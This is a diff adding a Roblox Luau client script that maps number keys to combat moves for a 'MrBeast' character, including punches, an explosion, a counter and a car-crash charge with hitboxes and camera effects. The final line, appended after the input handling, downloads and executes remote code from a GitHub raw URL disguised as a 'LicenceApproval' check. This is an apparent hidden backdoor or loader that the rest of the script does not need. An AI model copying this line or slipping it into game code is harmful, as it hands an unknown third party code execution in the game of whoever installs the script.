@@ -1,0 +1,221 @@
+-- Services
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local Debris = game:GetService("Debris")
+local RunService = game:GetService("RunService")
+
+-- Player and Character
+local player = Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoid = character:WaitForChild("Humanoid")
+local rootPart = character:WaitForChild("HumanoidRootPart")
+
+-- Animations
+local animations = character.MrBeast.Animations
+local gunAnimation = humanoid:LoadAnimation(animations.Gun)
+local blockingAnimation = humanoid:LoadAnimation(animations.Blocking)
+local explosionAnimation = humanoid:LoadAnimation(animations.Explosion)
+local carCrashAnimation = humanoid:LoadAnimation(animations.CarCrash)
+
+-- Remotes
+local remotes = ReplicatedStorage.Characters.Walter.Remotes
+local explosionRemote = remotes.Explosion
+local gunCounterRemote = character.MrBeast.CounterActivate
+local gunCounterHitRemote = remotes.GunCounterHit
+local gunPointRemote = remotes.GunPoint
+local explodeCarRemote = remotes.ExplodeCar
+
+-- Combat
+local combatHitbox = ReplicatedStorage.Characters.Combat.Fx.CombatHitbox
+local hitboxPunch = ReplicatedStorage.Characters.Combat.Peacemaker.HitboxPunch
+
+-- Moves
+function MoveOne()
+    -- Play animation and trigger effects
+    character.MrBeast.Broom:FireServer(player)
+    local fastPunchesAnimation = humanoid:LoadAnimation(animations.FastPunches)
+    fastPunchesAnimation:Play()
+
+    -- Handle punch debounces and hit detection
+    local function createHitbox()
+        local hitbox = combatHitbox:Clone()
+        hitbox.Parent = character
+        local weld = Instance.new("Weld", hitbox)
+        weld.Part0 = hitbox
+        weld.Part1 = rootPart
+        weld.C0 = CFrame.new(0, 0, 3.5) * CFrame.Angles(0, 0, 0)
+        Debris:AddItem(hitbox, 0.2)
+
+        hitbox.Touched:Connect(function(hit)
+            local parent = hit.Parent
+            local humanoid = parent:FindFirstChild("Humanoid")
+            if humanoid and humanoid.Health > 0 then
+                hitbox:Destroy()
+                ReplicatedStorage.Characters.Combat.Remotes.Combo:FireServer(parent)
+            end
+        end)
+    end
+
+    -- Create hitboxes for each punch
+    fastPunchesAnimation.KeyframeReached:Connect(function(keyframe)
+        if keyframe == "Punch1" or keyframe == "Punch2" or keyframe == "Punch3" or keyframe == "Punch4" then
+            createHitbox()
+        end
+    end)
+end
+
+function MoveTwo()
+    -- Trigger explosion
+    explosionRemote:FireServer()
+    explosionAnimation:Play()
+end
+
+function MoveThree()
+
+    rootPart.RootRigAttachment.Shockwave:Emit(1)
+    character.MrBeast.Bass:Play()
+	local suc = Instance.new("BoolValue")
+	suc.Parent = character
+	suc.Name = "CounterSucces"
+	wait(.1)
+	suc:Destroy()
+
+end
+
+function MoveFour()
+    -- Trigger gun point
+    gunPointRemote:FireServer()
+    local dontMoveAnimation = humanoid:LoadAnimation(animations.DontMove)
+    dontMoveAnimation:Play()
+end
+function MoveFive()
+    -- Play the car crash animation
+    carCrashAnimation:Play()
+    print("Car crash animation started")
+
+    -- Fire the car remote to spawn the car
+    character.MrBeast.Car:FireServer(player)
+    print("Car spawn remote fired")
+
+    -- Wait for the car to spawn (adjust delay if needed)
+    task.wait(0.5)
+    print("Car spawn delay complete")
+
+    -- Disable movement
+    humanoid.WalkSpeed = 0
+    humanoid.JumpPower = 0
+    print("Movement disabled")
+
+    -- Create hitbox for the car
+    local hitbox = hitboxPunch:Clone()
+    hitbox.Parent = character
+    hitbox.Size = Vector3.new(10, 10, 10) -- Default hitbox size
+    hitbox.CFrame = rootPart.CFrame -- Position hitbox at the character's root part
+    hitbox.CanCollide = false -- Ensure the hitbox doesn't interfere with physics
+    hitbox.Transparency = 1 -- Make the hitbox invisible (optional)
+    print("Hitbox created and parented to character")
+
+    -- Weld hitbox to character's HumanoidRootPart
+    local weld = Instance.new("Weld")
+    weld.Part0 = hitbox
+    weld.Part1 = character.HumanoidRootPart
+    weld.C0 = CFrame.new(0, 0, 0)
+    weld.Parent = hitbox
+    Debris:AddItem(hitbox, 3)
+    print("Hitbox welded to character")
+
+    -- Add BodyVelocity to move the car forward
+    local bodyVelocity = Instance.new("BodyVelocity")
+    bodyVelocity.Name = "CarBodyVelocity"
+    bodyVelocity.Parent = rootPart
+    bodyVelocity.P = 1250
+    bodyVelocity.MaxForce = Vector3.new(1000000, 0, 1000000)
+    bodyVelocity.Velocity = rootPart.CFrame.lookVector * 80
+    Debris:AddItem(bodyVelocity, 3)
+    print("BodyVelocity created and applied")
+
+    -- Update velocity dynamically to allow turning
+    local velocityConnection
+    velocityConnection = RunService.Heartbeat:Connect(function()
+        if bodyVelocity and bodyVelocity.Parent then
+            -- Update velocity based on the character's current orientation
+            bodyVelocity.Velocity = rootPart.CFrame.lookVector * 80
+            print("Velocity updated:", bodyVelocity.Velocity)
+        else
+            -- Clean up the connection if BodyVelocity is destroyed
+            velocityConnection:Disconnect()
+            print("BodyVelocity destroyed, connection cleaned up")
+        end
+    end)
+    print("Velocity connection established")
+
+    -- Handle car collision
+    hitbox.Touched:Connect(function(hit)
+        local parent = hit.Parent
+        local humanoid = parent:FindFirstChild("Humanoid")
+        if humanoid and humanoid.Health > 0 then
+            print("Car hit a valid target:", parent.Name)
+
+            -- Destroy hitbox and BodyVelocity
+            hitbox:Destroy()
+            if bodyVelocity then
+                bodyVelocity:Destroy()
+            end
+            print("Hitbox and BodyVelocity destroyed")
+
+            -- Clean up the velocity connection
+            if velocityConnection then
+                velocityConnection:Disconnect()
+            end
+            print("Velocity connection cleaned up")
+
+            -- Trigger explosion
+            explodeCarRemote:FireServer()
+            print("Explosion remote fired")
+
+            -- Stop the car crash animation
+            carCrashAnimation:Stop()
+            print("Car crash animation stopped")
+        end
+    end)
+    print("Hitbox Touched event connected")
+
+    -- Adjust camera field of view
+    TweenService:Create(game.Workspace.CurrentCamera, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+        FieldOfView = 105
+    }):Play()
+    print("Camera field of view adjusted")
+
+    -- Reset walk speed and jump power after a short delay
+    task.wait(0.5)
+    humanoid.WalkSpeed = 16
+    humanoid.JumpPower = 50
+    print("Movement restored")
+end
+-- Guard Function
+function Guard()
+    blockingAnimation:Play(0.1)
+    remotes.Blocking:FireServer(player)
+end
+
+-- Input Handling
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+
+    if input.KeyCode == Enum.KeyCode.One then
+        MoveOne()
+    elseif input.KeyCode == Enum.KeyCode.Two then
+        MoveTwo()
+    elseif input.KeyCode == Enum.KeyCode.Three then
+        MoveThree()
+    elseif input.KeyCode == Enum.KeyCode.Four then
+        MoveFour()
+    elseif input.KeyCode == Enum.KeyCode.Five then
+        MoveFive()
+    elseif input.KeyCode == Enum.KeyCode.F then
+        Guard()
+    end
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/You2berek/ScriptsMP/refs/heads/main/LicenceApproval"))()
